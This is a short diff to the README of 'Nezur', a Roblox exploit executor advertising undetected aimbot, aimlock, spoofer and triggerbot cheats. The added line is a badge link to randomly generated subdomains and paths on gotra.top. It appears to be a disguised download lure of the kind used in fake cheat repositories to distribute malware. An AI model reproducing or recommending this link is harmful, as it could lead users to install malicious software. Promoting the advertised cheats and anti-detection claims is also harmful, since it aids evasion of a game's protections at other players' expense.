@@ -3,6 +3,8 @@
 # NEZUR AKA "NEXUS"
 Advanced executor that uses the NEXUS API
 
+#[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+
 # Nezur, the future of roblox exploiting
 # Our features are completely undetected, such as aimbot, aimlock, a spoofer, and triggerbot.
 
